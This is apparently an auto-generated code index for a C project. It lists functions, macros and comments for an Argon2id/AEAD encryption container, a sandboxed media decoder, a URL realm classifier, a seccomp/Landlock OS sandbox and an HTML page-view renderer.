- `cipher_for` (line 298) `static const EVP_CIPHER *cipher_for(ls_aead aead)` - *#define LS_ARGON2_M_KIB  19456u  /* memory cost in KiB (19 MiB) #define LS_ARGON2_P      1u      /* lanes / parallelism /* Container field offsets. #define OFF_MAGIC   0u #define OFF_VERSION 4u #define OFF_AEAD    5u #define OFF_KDF     6u #define OFF_SALT    8u #define OFF_NONCE   24u static const uint8_t LS_MAGIC[4] = { 'F', 'R', 'Z', 'S' }; /* --- AEAD selection ---*
- `argon2id_derive` (line 308) `static ls_status argon2id_derive(const uint8_t *pass, size_t pass_len,
                          ...` - *static const uint8_t LS_MAGIC[4] = { 'F', 'R', 'Z', 'S' }; /* --- AEAD selection --- static const EVP_CIPHER *cipher_for(ls_aead aead) { switch (aead) { case LS_AEAD_AES256_GCM:        return EVP_aes_256_gcm(); case LS_AEAD_CHACHA20_POLY1305: return EVP_chacha20_poly1305(); default:                        return NULL; } } /* --- KDF: Argon2id ---*
- `ls_derive_key` (line 337) `ls_status ls_derive_key(const uint8_t *passphrase, size_t pass_len,
                        const...`
- `aead_encrypt` (line 346) `static ls_status aead_encrypt(const EVP_CIPHER *cipher, const uint8_t *key,
                     ...` - *int rc = EVP_KDF_derive(kctx, out, out_len, params); EVP_KDF_CTX_free(kctx); return (rc == 1) ? LS_OK : LS_ERR_KDF; } ls_status ls_derive_key(const uint8_t *passphrase, size_t pass_len, const uint8_t *salt, size_t salt_len, uint8_t out_key[LS_KEY_LEN]) { if (passphrase == NULL || salt == NULL || out_key == NULL) return LS_ERR_NULL_ARG; return argon2id_derive(passphrase, pass_len, salt, salt_len, out_key, LS_KEY_LEN); } /* --- AEAD primitives ---*
- `aead_decrypt` (line 372) `static ls_status aead_decrypt(const EVP_CIPHER *cipher, const uint8_t *key,
                     ...`
- `seal_core` (line 400) `static ls_status seal_core(const uint8_t *key, ls_aead aead, uint8_t kdf_id,
                    ...` - *if (aad_len > 0 && EVP_DecryptUpdate(ctx, NULL, &len, aad, (int)aad_len) != 1) goto done; if (ct_len > 0) { if (EVP_DecryptUpdate(ctx, pt, &len, ct, (int)ct_len) != 1) goto done; total = len; } if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_AEAD_SET_TAG, LS_TAG_LEN, (void *)tag) != 1) goto done; /* Tag verification happens here; a mismatch fails closed. st = (EVP_DecryptFinal_ex(ctx, pt + total, &len) == 1) ? LS_OK : LS_ERR_AUTH; done: EVP_CIPHER_CTX_free(ctx); return st; } /* --- container assembly / parsing ---*
- `decrypt_blob` (line 437) `static ls_status decrypt_blob(const uint8_t *key, const uint8_t *blob, size_t blob_len,
         ...`
- `ls_seal` (line 468) `ls_status ls_seal(const uint8_t key[LS_KEY_LEN], ls_aead aead,
                  const uint8_t *p...` - *if (pt == NULL) return LS_ERR_OOM; ls_status st = aead_decrypt(cipher, key, nonce, blob, LS_HEADER_LEN, ct, ct_len, tag, pt); if (st != LS_OK) { OPENSSL_cleanse(pt, alloc); /* never release unverified plaintext free(pt); return st; } out = pt; out_len = ct_len; return LS_OK; } /* --- public: raw-key API ---*
- `ls_open` (line 481) `ls_status ls_open(const uint8_t key[LS_KEY_LEN],
                  const uint8_t *blob, size_t bl...`
- `ls_seal_passphrase` (line 492) `ls_status ls_seal_passphrase(const uint8_t *passphrase, size_t pass_len, ls_aead aead,
          ...` - *memset(salt, 0, sizeof salt); /* unused under kdf_id = none return seal_core(key, aead, LS_KDF_NONE, salt, plaintext, pt_len, out, out_len); } ls_status ls_open(const uint8_t key[LS_KEY_LEN], const uint8_t *blob, size_t blob_len, uint8_t **out, size_t *out_len) { if (out == NULL || out_len == NULL) return LS_ERR_NULL_ARG; out = NULL; *out_len = 0; if (key == NULL || blob == NULL) return LS_ERR_NULL_ARG; return decrypt_blob(key, blob, blob_len, out, out_len); } /* --- public: passphrase API ---*
- `ls_open_passphrase` (line 513) `ls_status ls_open_passphrase(const uint8_t *passphrase, size_t pass_len,
                        ...`
- `ls_free` (line 533) `void ls_free(uint8_t *buf, size_t len)`

**Macros:**
- `OSSL_KDF_PARAM_ARGON2_LANES` (line 3)
- `OSSL_KDF_PARAM_ARGON2_MEMCOST` (line 6)
- `OSSL_KDF_PARAM_THREADS` (line 9)
- `_GNU_SOURCE` (line 11)
- `OSSL_KDF_PARAM_ARGON2_LANES` (line 14)
- `OSSL_KDF_PARAM_ARGON2_MEMCOST` (line 17)
- `OSSL_KDF_PARAM_THREADS` (line 20)
- `_GNU_SOURCE` (line 22)
- `OSSL_KDF_PARAM_ARGON2_LANES` (line 25)
- `OSSL_KDF_PARAM_ARGON2_MEMCOST` (line 28)
- `OSSL_KDF_PARAM_THREADS` (line 31)
- `_GNU_SOURCE` (line 33)
- `OSSL_KDF_PARAM_ARGON2_LANES` (line 36)
- `OSSL_KDF_PARAM_ARGON2_MEMCOST` (line 39)
- `OSSL_KDF_PARAM_THREADS` (line 42)
- `_GNU_SOURCE` (line 44)
- `OSSL_KDF_PARAM_ARGON2_LANES` (line 47)
- `OSSL_KDF_PARAM_ARGON2_MEMCOST` (line 50)
- `OSSL_KDF_PARAM_THREADS` (line 53)
- `_GNU_SOURCE` (line 55)
- `OSSL_KDF_PARAM_ARGON2_LANES` (line 58)
- `OSSL_KDF_PARAM_ARGON2_MEMCOST` (line 61)
- `OSSL_KDF_PARAM_THREADS` (line 64)
- `_GNU_SOURCE` (line 66)
- `OSSL_KDF_PARAM_ARGON2_LANES` (line 69)
- `OSSL_KDF_PARAM_ARGON2_MEMCOST` (line 72)
- `OSSL_KDF_PARAM_THREADS` (line 75)
- `_GNU_SOURCE` (line 77)
- `OSSL_KDF_PARAM_ARGON2_LANES` (line 80)
- `OSSL_KDF_PARAM_ARGON2_MEMCOST` (line 83)
- `OSSL_KDF_PARAM_THREADS` (line 86)
- `_GNU_SOURCE` (line 88)
- `OSSL_KDF_PARAM_ARGON2_LANES` (line 91)
- `OSSL_KDF_PARAM_ARGON2_MEMCOST` (line 94)
- `OSSL_KDF_PARAM_THREADS` (line 97)
- `_GNU_SOURCE` (line 99)
- `OSSL_KDF_PARAM_ARGON2_LANES` (line 102)
- `OSSL_KDF_PARAM_ARGON2_MEMCOST` (line 105)
- `OSSL_KDF_PARAM_THREADS` (line 108)
- `_GNU_SOURCE` (line 110)
- `OSSL_KDF_PARAM_ARGON2_LANES` (line 113)
- `OSSL_KDF_PARAM_ARGON2_MEMCOST` (line 116)
- `OSSL_KDF_PARAM_THREADS` (line 119)
- `_GNU_SOURCE` (line 121)
- `OSSL_KDF_PARAM_ARGON2_LANES` (line 124)
- `OSSL_KDF_PARAM_ARGON2_MEMCOST` (line 127)
- `OSSL_KDF_PARAM_THREADS` (line 130)
- `_GNU_SOURCE` (line 132)
- `OSSL_KDF_PARAM_ARGON2_LANES` (line 135)
- `OSSL_KDF_PARAM_ARGON2_MEMCOST` (line 138)
- `OSSL_KDF_PARAM_THREADS` (line 141)
- `_GNU_SOURCE` (line 143)
- `OSSL_KDF_PARAM_ARGON2_LANES` (line 146)
- `OSSL_KDF_PARAM_ARGON2_MEMCOST` (line 149)
- `OSSL_KDF_PARAM_THREADS` (line 152)
- `_GNU_SOURCE` (line 154)
- `OSSL_KDF_PARAM_ARGON2_LANES` (line 157)
- `OSSL_KDF_PARAM_ARGON2_MEMCOST` (line 160)
- `OSSL_KDF_PARAM_THREADS` (line 163)
- `_GNU_SOURCE` (line 165)
- `OSSL_KDF_PARAM_ARGON2_LANES` (line 168)
- `OSSL_KDF_PARAM_ARGON2_MEMCOST` (line 171)
- `OSSL_KDF_PARAM_THREADS` (line 174)
- `_GNU_SOURCE` (line 176)
- `OSSL_KDF_PARAM_ARGON2_LANES` (line 179)
- `OSSL_KDF_PARAM_ARGON2_MEMCOST` (line 182)
- `OSSL_KDF_PARAM_THREADS` (line 185)
- `_GNU_SOURCE` (line 187)
- `OSSL_KDF_PARAM_ARGON2_LANES` (line 190)
- `OSSL_KDF_PARAM_ARGON2_MEMCOST` (line 193)
- `OSSL_KDF_PARAM_THREADS` (line 196)
- `_GNU_SOURCE` (line 198)
- `OSSL_KDF_PARAM_ARGON2_LANES` (line 201)
- `OSSL_KDF_PARAM_ARGON2_MEMCOST` (line 204)
- `OSSL_KDF_PARAM_THREADS` (line 207)
- `_GNU_SOURCE` (line 209)
- `OSSL_KDF_PARAM_ARGON2_LANES` (line 212)
- `OSSL_KDF_PARAM_ARGON2_MEMCOST` (line 215)
- `OSSL_KDF_PARAM_THREADS` (line 218)
- `_GNU_SOURCE` (line 220)
- `OSSL_KDF_PARAM_ARGON2_LANES` (line 223)
- `OSSL_KDF_PARAM_ARGON2_MEMCOST` (line 226)
- `OSSL_KDF_PARAM_THREADS` (line 229)
- `_GNU_SOURCE` (line 231)
- `OSSL_KDF_PARAM_ARGON2_LANES` (line 234)
- `OSSL_KDF_PARAM_ARGON2_MEMCOST` (line 237)
- `OSSL_KDF_PARAM_THREADS` (line 240)
- `_GNU_SOURCE` (line 242)
- `OSSL_KDF_PARAM_ARGON2_LANES` (line 269)
- `OSSL_KDF_PARAM_ARGON2_MEMCOST` (line 272)
- `OSSL_KDF_PARAM_THREADS` (line 275)
- `LS_VERSION` (line 277)
- `LS_KDF_NONE` (line 279)
- `LS_KDF_ARGON2ID` (line 280)
- `LS_ARGON2_T` (line 283)
- `LS_ARGON2_M_KIB` (line 284)
- `LS_ARGON2_P` (line 285)
- `OFF_MAGIC` (line 288)
- `OFF_VERSION` (line 289)
- `OFF_AEAD` (line 290)
- `OFF_KDF` (line 291)
- `OFF_SALT` (line 292)
- `OFF_NONCE` (line 293)

#### `media_decoder.c`
**Path:** `src/media_decoder.c`

**Functions:**
- `open` (line 17) `*
 * Sandbox: the decoder needs open() for shared libraries (.so loading) and
 * brk/mmap for FFm...`
- `decoder_close` (line 78) `static void decoder_close(decoder_ctx *dc)` - *AVFrame         *frame;  /* decoded frame (YUV) AVFrame         *rgb;    /* converted frame (ARGB) AVFrame         *audio_frame; /* decoded audio frame struct SwsContext *sws;  /* colour converter AVPacket        *pkt; int64_t          pts_offset_us; /* running sum of segment durations int              eos_sent;      /* have we sent MD_EOS after MD_FLUSH? /* Audio int audio_stream_idx; int audio_sample_rate; int audio_channels; } decoder_ctx; /* Frees all FFmpeg objects inside ctx but NOT ctx itself. Zeros the struct.*
- `decoder_init` (line 96) `static int decoder_init(decoder_ctx *dc, const uint8_t *data, size_t len)` - *Initialises the decoder from the first TS segment bytes. The caller passes the complete segment data so avformat can probe it. On success the * decoder context is ready for decode_segment calls.*
- `decode_segment` (line 222) `static int decode_segment(decoder_ctx *dc, const uint8_t *data, size_t len)` - *Decodes one segment of TS data and sends frames. Returns the number of * frames sent, or -1 on fatal error.*
- `media_decoder_run` (line 422) `void media_decoder_run(int out_fd, int cmd_fd)` - *write_full(dc->out_fd, &pcm_bytes, sizeof pcm_bytes); write_full(dc->out_fd, pcm, pcm_bytes); free(pcm); } } av_frame_unref(dc->audio_frame); } } avformat_close_input(&seg_fmt); return nframes; } /* --- main decoder loop ---*
- `media_decoder_spawn` (line 523) `int media_decoder_spawn(pid_t *pid, int *out_fd, int *cmd_fd)`

**Macros:**
- `_POSIX_C_SOURCE` (line 22)

**Structs:**
- `decoder_ctx` (line 54)

#### `net_realm.c`
**Path:** `src/net_realm.c`

**Functions:**
- `lower` (line 16) `static char lower(char c)` - *define NR_MAX_HOST 253u*
- `ends_with_realm` (line 23) `static int ends_with_realm(const char *host, size_t n, const char *suffix)` - *True if the lowercased host (length n) ends with ".suffix" AND has at least one * non-empty label before the dot. suffix is given without its leading dot.*
- `nr_classify_host` (line 33) `nr_realm nr_classify_host(const char *host)`
- `host_of` (line 52) `static int host_of(const char *url, char *out, size_t out_size)` - *Extracts the host of scheme://host[:port][/...] into out (lowercased not required * here; nr_classify_host lowercases). Returns 0 on success, -1 if no host.*
- `nr_classify_url` (line 67) `nr_realm nr_classify_url(const char *url)`
- `nr_route_for` (line 73) `nr_route nr_route_for(const char *url, nr_config cfg)`
- `nr_realm_allows_http` (line 87) `int nr_realm_allows_http(nr_realm r)`
- `nr_realm_name` (line 93) `const char *nr_realm_name(nr_realm r)`
- `nr_route_name` (line 102) `const char *nr_route_name(nr_route r)`

**Macros:**
- `NR_MAX_HOST` (line 14)

#### `os_sandbox.c`
**Path:** `src/os_sandbox.c`

**Functions:**
- `os_policy_allows` (line 51) `int os_policy_allows(long syscall_nr)` - *define OS_ALLOWED_N (sizeof os_allowed / sizeof os_allowed[0])*
- `os_policy_size` (line 58) `size_t os_policy_size(void)`
- `os_prot_allowed` (line 65) `int os_prot_allowed(long syscall_nr, unsigned long prot)` - *W^X mirror: mmap/mprotect keep their membership but lose any request that asks * for executable memory. The single source of truth the BPF prot-check replicates.*
- `os_no_dump` (line 75) `os_status os_no_dump(void)` - *Anti-dump defense in depth: undumpable + no core file, so neither a crash nor a foreign ptrace can exfiltrate worker secrets. Best-effort; call before os_harden * (prctl is not on the seccomp allowlist).*
- `excluded` (line 89) `* intentionally excluded (they need /proc remounting and a post-unshare fork). */
int os_namespac...`
- `os_isolate_namespaces` (line 93) `os_status os_isolate_namespaces(void)`
- `os_policy_allows` (line 105) `int os_policy_allows(long syscall_nr)` - *Unprivileged user namespaces disabled (EPERM) or unsupported kernel * (EINVAL/ENOSYS): not fatal -- seccomp remains the mandatory boundary. return (errno == EPERM || errno == EINVAL || errno == ENOSYS) ? OS_ERR_UNSUPPORTED : OS_ERR_NAMESPACE; } return OS_OK; } #else /* non-Linux: no seccomp-bpf, no Linux namespaces*
- `os_policy_size` (line 107) `size_t os_policy_size(void)`
- `os_prot_allowed` (line 108) `int os_prot_allowed(long syscall_nr, unsigned long prot)`
- `os_no_dump` (line 111) `os_status os_no_dump(void)`
- `os_harden` (line 112) `os_status os_harden(os_violation action)`
- `os_namespace_flags` (line 114) `int os_namespace_flags(void)`
- `os_isolate_namespaces` (line 116) `os_status os_isolate_namespaces(void)`
- `os_harden` (line 144) `os_status os_harden(os_violation action)` - *The native ABI token the BPF arch guard pins to (rejects x32/i386 on x86_64 and * AArch32 on aarch64 -- syscall-ABI-confusion defence). if defined(__x86_64__) define OS_SECCOMP_ARCH AUDIT_ARCH_X86_64 else define OS_SECCOMP_ARCH AUDIT_ARCH_AARCH64 endif*
- `ll_create_ruleset` (line 238) `static long ll_create_ruleset(const struct landlock_ruleset_attr *attr,
                         ...` - *include <errno.h> include <fcntl.h> include <stddef.h> include <stdint.h> include <string.h> include <unistd.h> include <linux/landlock.h> include <sys/prctl.h> include <sys/syscall.h>*
- `ll_add_rule` (line 243) `static long ll_add_rule(int fd, enum landlock_rule_type type,
                        const void ...`
- `ll_restrict_self` (line 248) `static long ll_restrict_self(int fd, uint32_t flags)`
- `ll_handled` (line 265) `static uint64_t ll_handled(int abi)` - *The set of FS rights the ruleset handles, masked to what this ABI supports so * landlock_create_ruleset does not fail with EINVAL on older kernels.*
- `ll_read_access` (line 278) `static uint64_t ll_read_access(uint64_t handled)`
- `os_landlock_abi` (line 284) `int os_landlock_abi(void)`
- `os_landlock_restrict` (line 290) `os_status os_landlock_restrict(const os_fs_rule *rules, size_t n)`
- `os_landlock_abi` (line 330) `int os_landlock_abi(void)` - *pb.parent_fd = pfd; long rc = ll_add_rule(rfd, LANDLOCK_RULE_PATH_BENEATH, &pb, 0); close(pfd); if (rc != 0) { close(rfd); return OS_ERR_LANDLOCK; } } /* No-new-privs is required before restrict_self; it also pins the domain. if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0) { close(rfd); return OS_ERR_LANDLOCK; } if (ll_restrict_self(rfd, 0) != 0) { close(rfd); return OS_ERR_LANDLOCK; } close(rfd); return OS_OK; } #else /* non-Linux, or kernel headers without Landlock*
- `os_landlock_restrict` (line 332) `os_status os_landlock_restrict(const os_fs_rule *rules, size_t n)`

**Macros:**
- `_GNU_SOURCE` (line 12)
- `OS_ALLOWED_N` (line 49)
- `OS_SECCOMP_ARCH` (line 140)
- `OS_SECCOMP_ARCH` (line 142)
- `LL_FS_BASE` (line 254)

#### `page_view.c`
**Path:** `src/page_view.c`

**Functions:**
- `cp1252_to_ucs` (line 53) `static unsigned int cp1252_to_ucs(unsigned char c)` - *Unicode scalar for a Windows-1252 byte (only meaningful for c >= 0x80). 0xA0.. 0xFF map identically to Latin-1 (code point == byte). 0x80..0x9F carry the Windows-1252 printable glyphs; the five undefined positions return 0 (the caller * emits '?').*
- `utf8_encode` (line 67) `static size_t utf8_encode(unsigned int cp, char *out)` - *Encodes a BMP scalar (<= 0xFFFF, which covers all Windows-1252 targets) as * UTF-8 into out (up to 3 bytes); returns the byte count written.*
- `utf8_sanitized_dup` (line 79) `static char *utf8_sanitized_dup(const char *s)`
- `dup_n` (line 113) `static char *dup_n(const char *s, size_t n)`
- `run_init_common` (line 128) `static void run_init_common(pv_run *r)` - *Common field initialization shared by all append helpers. Keeps the three constructors DRY and guarantees every run starts from the same sentinel state * (including the Stage 0 node_id and the Step D block_id).*
- `pv_node_map_init` (line 219) `static int pv_node_map_init(pv_node_map *m)`
- `pv_node_map_free` (line 227) `static void pv_node_map_free(pv_node_map *m)`
- `pv_node_map_build` (line 264) `static int pv_node_map_build(pv_node_map *m, const lxb_dom_node_t *root)` - *Builds a document-order map of all element nodes under root. Returns 0, or -1 on * allocation failure.*
- `pv_new` (line 272) `pv_view *pv_new(void)`
- `pv_append` (line 276) `pv_status pv_append(pv_view *v, pv_kind kind, int heading, int block_break,
                    c...`
- `pv_append_image` (line 310) `pv_status pv_append_image(pv_view *v, int heading, int block_break,
                          con...`
- `pv_append_input` (line 340) `pv_status pv_append_input(pv_view *v, int heading, int block_break,
                          pv_...`
- `pv_append_video` (line 380) `pv_status pv_append_video(pv_view *v, int heading, int block_break,
                          con...`
- `pv_set_emphasis` (line 416) `void pv_set_emphasis(pv_view *v, int bold, int italic)`
- `pv_set_indent` (line 423) `void pv_set_indent(pv_view *v, int indent)`
- `pv_set_color` (line 428) `void pv_set_color(pv_view *v, int fg_rgb)`
- `pv_set_bgcolor` (line 433) `void pv_set_bgcolor(pv_view *v, int bg_rgb)`
- `pv_set_text_style` (line 438) `void pv_set_text_style(pv_view *v, int text_align, int font_scale, int line_scale,
              ...`
- `pv_set_text_ext` (line 448) `void pv_set_text_ext(pv_view *v, const pv_text_ext *e)`
- `pv_set_container` (line 478) `void pv_set_container(pv_view *v, int cont_id, int cont_display,
                      int cont_g...`
- `pv_set_grid` (line 493) `void pv_set_grid(pv_view *v, const int *col_w, int n, int col_span)`
- `pv_set_flex` (line 503) `void pv_set_flex(pv_view *v, int flex_grow, int flex_shrink, int flex_basis,
                 int...`
- `pv_set_cont_item` (line 515) `void pv_set_cont_item(pv_view *v, int cont_item)`
- `pv_set_float` (line 520) `void pv_set_float(pv_view *v, int float_side, int float_id, int float_clear)`
- `pv_set_box` (line 528) `void pv_set_box(pv_view *v, int box_l, int box_r, int box_w,
                int box_center, int ...`
- `pv_set_box_pct` (line 540) `void pv_set_box_pct(pv_view *v, int box_w_pct)`
- `pv_set_node_id` (line 545) `void pv_set_node_id(pv_view *v, dom_node_id node_id)`
- `pv_set_block_id` (line 550) `void pv_set_block_id(pv_view *v, int block_id)`
- `pv_set_input_checked` (line 555) `void pv_set_input_checked(pv_view *v, int checked)`
- `pv_set_input_select_opts` (line 560) `void pv_set_input_select_opts(pv_view *v, const char *select_opts)`
- `pv_add_box_def` (line 568) `pv_status pv_add_box_def(pv_view *v, const pv_box_def *d)`
- `pv_free` (line 581) `void pv_free(pv_view *v)`
- `pv_count` (line 597) `size_t pv_count(const pv_view *v)`
- `pv_at` (line 601) `const pv_run *pv_at(const pv_view *v, size_t i)`
- `pv_box_count` (line 606) `size_t pv_box_count(const pv_view *v)`
- `pv_box_at` (line 610) `const pv_box_def *pv_box_at(const pv_view *v, size_t i)`
- `node_next` (line 619) `static lxb_dom_node_t *node_next(lxb_dom_node_t *node, const lxb_dom_node_t *root)` - *} size_t pv_box_count(const pv_view *v) { return (v != NULL) ? v->nbox : 0; } const pv_box_def *pv_box_at(const pv_view *v, size_t i) { if (v == NULL || i >= v->nbox) return NULL; return &v->boxes[i]; } /* --- builder helpers --- /* Iterative pre-order successor of node within the subtree rooted at root.*
- `is_block_tag` (line 628) `static int is_block_tag(lxb_tag_id_t t)`
- `is_block_like` (line 654) `static int is_block_like(lxb_tag_id_t t, css_display display)` - *An element should be treated as block-like (eligible for box registration, hbox, float) when its CSS display property indicates a block-level box, even if the tag itself is normally inline. This lets author CSS like a { display: inline-block; width: 22px; } * actually create a box for the <a> tag.*
- `causes_block_break` (line 664) `static int causes_block_break(lxb_tag_id_t t, css_display display)` - *Returns 1 when the element should cause a block break (start a new line). display:inline-block and display:inline do NOT cause a break; they flow * inline while still being eligible for box registration.*
- `heading_level` (line 669) `static int heading_level(lxb_tag_id_t t)`
- `is_skipped_tag` (line 681) `static int is_skipped_tag(lxb_tag_id_t t)`
- `node_tag` (line 694) `static lxb_tag_id_t node_tag(const lxb_dom_node_t *n)`
- `in_skipped_subtree` (line 703) `static int in_skipped_subtree(const lxb_dom_node_t *n, const lxb_dom_node_t *base,
              ...` - *Nonzero if any ancestor up to base is a non-rendered container. When js_enabled, a <noscript> ancestor also suppresses content (the script would run, so the fallback is hidden); when JS is off, <noscript> content IS rendered (a no-JS * browser shows the fallback).*
- `font_color_attr` (line 739) `static int font_color_attr(lxb_dom_element_t *el)`
- `bgcolor_attr` (line 746) `static int bgcolor_attr(lxb_dom_element_t *el)` - *Legacy bgcolor attribute (body/table/tr/td), the background twin of <font * color>: pre-CSS sites (Hacker News' orange bar and beige page) still use it.*
- `item_ordinal` (line 798) `static int item_ordinal(pv_item_track *tr, int cid, const lxb_dom_node_t *item)` - *Ordinal for a run of container `cid` whose direct-child item is `item` (NULL = * anonymous: every such run is its own item). -1 when the run has no container.*
- `pv_text_ext_reset` (line 820) `void pv_text_ext_reset(pv_text_ext *e)` - *The author text-presentation extensions struct (pv_text_ext) is public now (include/page_view.h): each field resolves from the nearest ancestor that sets it (they inherit in CSS). list_style drives the <li> marker (structural); the * rest are gated by caps.css downstream.*
- `pv_text_ext_merge` (line 840) `static void pv_text_ext_merge(pv_text_ext *e, const css_style *cs)` - *Merges one ancestor's resolved css_style into ext, nearest ancestor first (a field * already set is not overwritten — keeps the nearest, matching inheritance).*
- `css_has_hbox` (line 879) `static int css_has_hbox(const css_style *cs)` - *caret-color: an explicit `auto` (CSS_LEN_AUTO) on a nearer ancestor is a * resolved value -- it stops the walk, and pv_set_text_ext maps it to -1. if (e->caret_color == -1 && cs->caret_color != -1) e->caret_color = cs->caret_color; if (e->object_fit == 0 && cs->object_fit != CSS_OFI_UNSET) e->object_fit = cs->object_fit; } /* True if the resolved style declares any HORIZONTAL box property.*
- `css_hbox_resolve` (line 890) `static void css_hbox_resolve(const css_style *cs, pv_box_info *out)` - *Pre-resolves the horizontal box (px) into a run's wire fields: l/r insets = padding + non-auto margin of each side (clamped >= 0); w = the tightest of * width/max-width (0 = none); center = margin: 0 auto with a width cap.*
- `css_has_position` (line 918) `static int css_has_position(const css_style *cs)` - *A real (non-static) position makes a block box-carrying too, so its position/insets/ * z-index ride the box-def tree (painted for relative; carried for the box engine).*
- `css_has_boxdeco` (line 922) `static int css_has_boxdeco(const css_style *cs)`
- `container_id` (line 968) `static int container_id(pv_container_reg *reg, const lxb_dom_node_t *node)` - *Document-order registry of flex/grid container nodes, so the runs of one * container share a stable id. typedef struct pv_container_reg { const lxb_dom_node_t *node[PV_MAX_CONTAINERS]; size_t count; } pv_container_reg; /* Id of node in reg, registering it on first sight. -1 when reg is full.*
- `boxdef_from_style` (line 988) `static void boxdef_from_style(pv_box_def *d, const css_style *cs)` - *Fills *d (decoration + hbox + bg; parent_id defaults to -1) from a resolved style. Padding unset -> 0 (geometry default); the rest keep the css module's sentinels * (PV_LEN_UNSET width/radius/outline width, -1 colors, 0 the rest).*
- `box_reg_id` (line 1055) `static int box_reg_id(pv_box_reg *r, const lxb_dom_node_t *node, const css_style *cs)` - *Id of node in the box registry, recording its decoration on first sight. -1 when * full. The parent link is stamped separately as the ancestor walk continues.*
- `pv_style_cache_init` (line 1081) `static int pv_style_cache_init(pv_style_cache *c)`
- `pv_style_cache_free` (line 1094) `static void pv_style_cache_free(pv_style_cache *c)`
- `cached_element_style` (line 1103) `static css_style cached_element_style(lxb_dom_element_t *el, const css_sheet *sheet,
            ...` - *cch_element_style(el, sheet), memoized in *cache. A NULL cache (OOM at init, or a caller that opts out) simply calls through uncached -- never a hard * failure, matching every other degrade-on-OOM path in this module.*
- `css_to_fx_justify` (line 1132) `static int css_to_fx_justify(css_justify j)` - *Maps a css_justify (resolved by the css cascade) to a flex_layout fx_justify. * Unset / start / unknown all fall to FX_JUSTIFY_START (the default).*
- `is_bold_tag` (line 1147) `static int is_bold_tag(lxb_tag_id_t t)` - *Inline emphasis carried by a tag: bold from <b>/<strong>/<th>, italic from * <i>/<em>. <th> is a header cell, conventionally bold.*
- `is_italic_tag` (line 1150) `static int is_italic_tag(lxb_tag_id_t t)`
- `resolve_context` (line 1169) `static void resolve_context(const lxb_dom_node_t *n, const lxb_dom_node_t *base,
                ...` - *level, nearest block-level ancestor (defaults to base), the inherited author color (nearest ancestor that sets one, packed 0xRRGGBB, or -1), the author background (nearest ancestor that sets one), the inline emphasis (bold/italic), the author text-align (*align, a css_align) and font-size (*font_scale, percent), and the list context: the nearest <li> ancestor (*li, or NULL), the list nesting depth (*list_depth = count of <ul>/<ol> ancestors), and whether the innermost list is ordered (*ordered).  Author presentation now comes from the css module: for each ancestor element its computed css_style (document <style> sheet + that element's inline style=, inline winning) is merged into the inheriting fields, nearest ancestor first. Inline emphasis from tags (<b>/<em>/...) still applies; an explicit CSS font-weight / font-style on the nearest ancestor that sets it takes precedence over the tag * default. The <font color> attribute is a legacy fallback when no CSS color won.*
- `collapse_ws` (line 1388) `static char *collapse_ws(const char *s, size_t n)` - *prev_basis = cs.flex_basis; prev_order = cs.order; prev_align_self = cs.align_self; prev_col_span = (cs.grid_col_span > 0) ? cs.grid_col_span : 0; have_prev_el = 1; prev_el = p; } if (p == base) break; } bold = got_css_bold ? css_bold : tag_bold; italic = got_css_italic ? css_italic : tag_italic; } /* Collapses ASCII whitespace runs to a single space into a fresh buffer.*
- `parse_dim` (line 1412) `static int parse_dim(const lxb_char_t *s, size_t len)` - *Parses the leading non-negative integer of an HTML length attribute value (e.g. "640", "640px", "50%"). Returns the value clamped to a sane bound, or -1 * if the value is absent, empty, or does not start with a digit.*
- `srcset_first_url` (line 1436) `static void srcset_first_url(const lxb_char_t *srcset, size_t len,
                             c...` - *First candidate URL from a srcset attribute value ("url1 1x, url2 2x, ..."), used as a fallback source when an <img> has no plain src -- the common shape of responsive-image markup and of <picture><source srcset=...> (this parser has no viewport/DPR to pick among candidates, so the first one is the deterministic choice, matching how src is otherwise used verbatim). A regular URL candidate ends at the first whitespace or comma (an optional density/width descriptor, e.g. "2x", is separated from it by whitespace); a data: URL is scanned to the first whitespace or the end of the string instead, since its ";base64," marker contains a comma that is not a candidate separator. Returns the span via *out and *out_len (points into srcset, not owned, not * NUL-terminated); *out stays NULL when srcset has no usable candidate.*
- `find_body` (line 1466) `static lxb_dom_node_t *find_body(lxb_dom_node_t *root)`
- `forms_free` (line 1489) `static void forms_free(form_table *ft)`
- `ascii_ieq` (line 1497) `static int ascii_ieq(const char *s, const char *lit)` - *} form_rec; typedef struct form_table { form_rec *recs; size_t    count, cap; } form_table; static void forms_free(form_table *ft) { for (size_t i = 0; i < ft->count; ++i) free(ft->recs[i].action); free(ft->recs); ft->recs = NULL; ft->count = ft->cap = 0; } /* Case-insensitive ASCII equality of a NUL-terminated string against a literal.*
- `attr_dup` (line 1509) `static char *attr_dup(lxb_dom_element_t *el, const char *name, size_t namelen)` - *Owned NUL-terminated copy of an attribute value, or NULL when the attribute is * absent. A present-but-empty attribute yields a "" string (distinguishable).*
- `forms_add` (line 1518) `static int forms_add(form_table *ft, const lxb_dom_node_t *node)` - *Owned NUL-terminated copy of an attribute value, or NULL when the attribute is * absent. A present-but-empty attribute yields a "" string (distinguishable). static char *attr_dup(lxb_dom_element_t *el, const char *name, size_t namelen) { size_t L = 0; const lxb_char_t *v = lxb_dom_element_get_attribute(el, (const lxb_char_t *)name, namelen, &L); if (v == NULL) return NULL; return dup_n((const char *)v, L); } /* Records a <form> element. Returns 0, or -1 on OOM.*
- `form_for` (line 1538) `static int form_for(const form_table *ft, const lxb_dom_node_t *n,
                    const lxb_...` - *} lxb_dom_element_t *el = lxb_dom_interface_element((lxb_dom_node_t *)node); char *method = attr_dup(el, "method", 6); int m = ascii_ieq(method, "post") ? PV_METHOD_POST : PV_METHOD_GET; free(method); form_rec *r = &ft->recs[ft->count++]; r->node = node; r->action = attr_dup(el, "action", 6); /* may be NULL (submit to current doc) r->method = m; return 0; } /* Index of the nearest enclosing recorded form, or -1 when the control has none.*
- `under_unrendered` (line 1554) `static int under_unrendered(const lxb_dom_node_t *n, const lxb_dom_node_t *el)` - *Nonzero if a descendant text node sits under a non-rendered element (a <style> or <script> nested in the collected subtree -- with run_js the parser keeps <script> nodes in the tree, so a flattened cell or a <button> label would * otherwise paint raw CSS/JS source as content, as google.com's markup showed).*
- `collect_text` (line 1567) `static char *collect_text(const lxb_dom_node_t *el)` - *Concatenates the descendant text of el into an owned NUL-terminated string (the value of a <textarea> / the label of a <button> / a flattened table cell), * skipping text under non-rendered descendants. Never NULL on success.*
- `classify_input` (line 1590) `static pv_input_type classify_input(const char *type)`
